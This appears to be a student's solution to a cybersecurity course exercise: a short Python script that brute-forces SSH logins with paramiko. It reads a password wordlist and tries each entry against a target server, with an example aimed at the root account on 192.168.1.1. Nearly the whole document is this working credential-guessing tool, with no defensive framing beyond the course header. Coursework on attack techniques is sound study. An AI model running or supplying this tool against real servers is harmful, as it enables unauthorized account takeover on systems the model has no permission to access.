# !/usr/bin/env python3
# Script: OPS 401 Class 02 Ops Challenge Solution
# Author: Ademola
# Date of latest revision: 9 May 2023
# Purpose: Ops Challenge: Automated Brute Force Wordlist Attack Tool Part 2 of 3
# Firstly install paramiko using: **pip3 install paramiko**
import paramiko

def attempt_login(server_ip, username, password):
    """Attempt to login to the server."""
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(server_ip, username=username, password=password)
        return True
    except paramiko.AuthenticationException:
        return False
    finally:
        client.close()

def brute_force_ssh(server_ip, username, word_list_file):
    """Attempt to brute force the SSH server."""
    with open(word_list_file, 'r') as file:
        for line in file:
            password = line.strip()

            if attempt_login(server_ip, username, password):
                print(f'Success! The password is {password}')
                return password

    print('Failed to find password.')
    return None

# Example usage:
# brute_force_ssh('192.168.1.1', 'root', 'wordlist.txt')

# Reference
## <https://null-byte.wonderhowto.com/how-to/sploit-make-ssh-brute-forcer-python-0161689/>
## <https://www.geeksforgeeks.org/how-to-execute-shell-commands-in-a-remote-machine-using-python-paramiko/>
## OpenAI